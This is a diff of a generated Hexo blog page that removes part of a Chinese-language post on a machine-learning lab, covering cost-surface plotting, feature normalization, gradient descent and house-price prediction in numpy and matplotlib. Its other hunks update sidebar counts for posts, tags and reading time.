-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"><span class="keyword">from</span> matplotlib.colors <span class="keyword">import</span> LogNorm</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======== 3.可视化代价J(theta0,theta1) ========</span></span><br><span class="line">theta0_vals = np.linspace(-<span class="number">10</span>,<span class="number">10</span>,<span class="number">100</span>) <span class="comment"># xs的每一行都是theta0_vals的复制</span></span><br><span class="line">theta1_vals = np.linspace(-<span class="number">1</span>,<span class="number">4</span>,<span class="number">100</span>) <span class="comment"># ys的每一列都是theta1_vals的复制</span></span><br><span class="line">xs,ys = np.meshgrid(theta0_vals,theta1_vals) <span class="comment"># 生成网格点坐标矩阵</span></span><br><span class="line">J_vals = np.zeros(xs.shape)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,theta0_vals.size):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,theta1_vals.size):</span><br><span class="line">		t = np.array([theta0_vals[i],theta1_vals[j]])</span><br><span class="line">		J_vals[i][j] = compute_cost(X,Y,t)</span><br><span class="line">J_vals = np.transpose(J_vals)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制3D曲面图</span></span><br><span class="line">figure = plt.figure(<span class="number">2</span>)</span><br><span class="line">ax = Axes3D(figure) <span class="comment"># 把图像指定为3D视图</span></span><br><span class="line">ax.plot_surface(xs,ys,J_vals,cmap=<span class="string">&#x27;rainbow&#x27;</span>) <span class="comment"># 指定图形的色彩(彩虹色)</span></span><br><span class="line">plt.xlabel(<span class="string">r&#x27;$\theta_0$&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">r&#x27;$\theta_1$&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制代价的等高椭圆线</span></span><br><span class="line">plt.figure(<span class="number">3</span>)</span><br><span class="line">lvls = np.logspace(-<span class="number">2</span>, <span class="number">3</span>, <span class="number">20</span>)</span><br><span class="line">plt.contour(xs, ys, J_vals, levels=lvls, norm = LogNorm()) <span class="comment"># 设置坐标和值,指定等高线的值,指定色彩</span></span><br><span class="line">plt.plot(theta_fin[<span class="number">0</span>], theta_fin[<span class="number">1</span>], <span class="string">&#x27;ro&#x27;</span>,markersize =<span class="number">6</span>) <span class="comment"># 设置图像中的那个红点</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-<ul>
-<li>linspace(start , stop , num=50 , endpoint=True , retstep=False , dtype=None)：用于在线性空间中以均匀步长生成数字序列</li>
-<li>meshgrid(theta0_vals , theta0_vals)：生成坐标矩阵</li>
-<li>array(A , B , …. )：创建一个数组（参数有几个就是几维）</li>
-<li>logspace(start , stop , num=50 , endpoint=True , base=10.0)：把范围是 “[base的start次方,base的stop次方]” 的数据，在对数尺度上返回间隔均匀的数字（有点看不懂）</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.logspace(<span class="number">2.0</span>, <span class="number">3.0</span>, num=<span class="number">4</span>)</span><br><span class="line">array([ <span class="number">100.</span>        ,  <span class="number">215.443469</span>  ,  <span class="number">464.15888336</span>, <span class="number">1000.</span>        ])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.logspace(<span class="number">2.0</span>, <span class="number">3.0</span>, num=<span class="number">4</span>, endpoint=<span class="literal">False</span>) <span class="comment"># endpoint:停止时是否是最后一个样本</span></span><br><span class="line">array([<span class="number">100.</span>        ,  <span class="number">177.827941</span>  ,  <span class="number">316.22776602</span>,  <span class="number">562.34132519</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.logspace(<span class="number">2.0</span>, <span class="number">3.0</span>, num=<span class="number">4</span>, base=<span class="number">2.0</span>)</span><br><span class="line">array([<span class="number">4.</span>        ,  <span class="number">5.0396842</span> ,  <span class="number">6.34960421</span>,  <span class="number">8.</span>        ])</span><br></pre></td></tr></table></figure>
-<p>结果如下：</p>
-<img src="/2022/05/05/Machine-Learning-Lab1/1651750210936-1652006179448.png" class width="1651750210936"> 
-<img src="/2022/05/05/Machine-Learning-Lab1/1651750220564-1652006179448.png" class width="1651750220564"> 
-<h2 id="Linear-regression-with-multiple-variables（多元线性回归）"><a href="#Linear-regression-with-multiple-variables（多元线性回归）" class="headerlink" title="Linear regression with multiple variables（多元线性回归）"></a>Linear regression with multiple variables（多元线性回归）</h2><p>在这一部分中，您将使用多变量线性回归来预测房价：</p>
-<ul>
-<li>假设你要卖房子，你想知道一个好的市场价格是多少</li>
-<li>一种方法是首先收集最近售出房屋的信息，并制作一个房价模型<ul>
-<li>文件 ex1data2.txt 包含 Portland 房价的培训数据集（第一栏是房子的大小，第二栏是卧室的数量，第三栏是房子的价格）</li>
-<li>脚本 ex1_multi.m 已设置脚本以帮助您逐步完成此练习</li>
-</ul>
-</li>
-</ul>
-<h2 id="Feature-Normalization（特征规范化）"><a href="#Feature-Normalization（特征规范化）" class="headerlink" title="Feature Normalization（特征规范化）"></a>Feature Normalization（特征规范化）</h2><p>脚本 ex1_multi.m 首先加载并显示此数据集中的一些值，通过查看这些值，注意到：房屋大小大约是卧室数量的1000倍</p>
-<p>当特征相差几个数量级时，首先执行特征缩放可以使梯度下降更快地收敛</p>
-<p>Feature Normalization 的原理</p>
-<ul>
-<li>从数据集中减去每个特征的平均值</li>
-<li>减去平均值后，再将特征值按各自的“标准偏差”进行缩放（除）</li>
-</ul>
-<p>Feature Normalization 代码实现：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">feature_normalize</span>(<span class="params">Xdata</span>):</span></span><br><span class="line">	X_mean = np.mean(Xdata,axis=<span class="number">0</span>)</span><br><span class="line">	X_std = np.std(Xdata,axis=<span class="number">0</span>)</span><br><span class="line">	X_norm = np.divide(np.subtract(Xdata,X_mean),X_std)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> X_norm,X_mean,X_std</span><br></pre></td></tr></table></figure>
-<ul>
-<li>mean(A , axis=0)：计算每一维度的均值</li>
-<li>std(A , axis=0)：计算沿指定轴的标准差</li>
-<li>divide(A , B)：数组对应位置元素进行除法</li>
-<li>subtract(A , B)：数组对应位置元素进行减法</li>
-</ul>
-<p><strong>Completion process（具体过程）</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ======== 1.读取数据并标准化数据的特征 ========</span></span><br><span class="line">data = np.loadtxt(<span class="string">r&#x27;data\ex1data2.txt&#x27;</span>,delimiter =<span class="string">&#x27;,&#x27;</span>) <span class="comment"># 从文件中读取数据,中间用&#x27;,&#x27;作为分隔符(第一栏是房子的大小，第二栏是卧室的数量，第三栏是房子的价格)</span></span><br><span class="line">Xdata = data[:,<span class="number">0</span>:<span class="number">2</span>] <span class="comment"># 房子的大小&amp;卧室的数量(因)</span></span><br><span class="line">Ydata = data[:,<span class="number">2</span>] <span class="comment"># 房子的价格(果)</span></span><br><span class="line">X,mu,sigma = feature_normalize(Xdata) <span class="comment"># 对输入数据特征进行标准化</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Mu is:&#x27;</span>,mu)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Sigma is:&#x27;</span>,sigma)</span><br><span class="line">X = np.c_[np.ones(X.shape[<span class="number">0</span>]),X] <span class="comment"># 给输入数据Xdata增加一个偏置维度</span></span><br><span class="line">Y = Ydata</span><br></pre></td></tr></table></figure>
-<h2 id="Plotting-the-Data-B（绘制数据）"><a href="#Plotting-the-Data-B（绘制数据）" class="headerlink" title="Plotting the Data B（绘制数据）"></a>Plotting the Data B（绘制数据）</h2><p>这一部分我们需要绘制反应 “迭代次数和代价函数值关系” 的图形，还是使用梯度下降法求解：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gradientDescent <span class="keyword">import</span> gradient_descent <span class="keyword">as</span> gd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======== 2.使用梯度下降法求解 ========</span></span><br><span class="line">theta_init = np.zeros(X.shape[<span class="number">1</span>])</span><br><span class="line">alpha = <span class="number">0.05</span></span><br><span class="line">num_iters = <span class="number">300</span></span><br><span class="line"></span><br><span class="line">theta,J_history = gd(X,Y,theta_init,alpha,num_iters) <span class="comment"># 利用梯度下降法进行优化求解,返回记录代价历史值的J_history,和最终θ(theta)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制&quot;迭代次数和代价函数值关系&quot;的图形</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(np.arange(J_history.size),J_history)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Number of iterations&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Cost J&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Theta computed from gradient descent : \n&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(theta)) <span class="comment"># PS:theta是数组格式</span></span><br></pre></td></tr></table></figure>
-<p>梯度下降算法和前面实现的一样，就不多赘述了，下面是“预测”的过程：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ======== 3.预测 ========</span></span><br><span class="line">Xtest = np.array([<span class="number">1</span>,<span class="number">1650</span>,<span class="number">3</span>])</span><br><span class="line">price = np.dot(Xtest,np.transpose(theta))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Predicted price of a 1650 sq-ft, 3 br house (using normal equations) : &#123;:0.3f&#125;&#x27;</span>.<span class="built_in">format</span>(price))</span><br></pre></td></tr></table></figure>
-<p>结构如下：</p>
-<img src="/2022/05/05/Machine-Learning-Lab1/1651758783011-1652006179448.png" class width="1651758783011"> 
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2873,7 +2876,7 @@ J(θ_0,θ_1)=
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">159</span>
+          <span class="site-state-item-count">160</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2886,7 +2889,7 @@ J(θ_0,θ_1)=
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">106</span>
+        <span class="site-state-item-count">107</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -2927,7 +2930,7 @@ J(θ_0,θ_1)=
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">31:16</span>
+    <span title="Reading time total">31:27</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
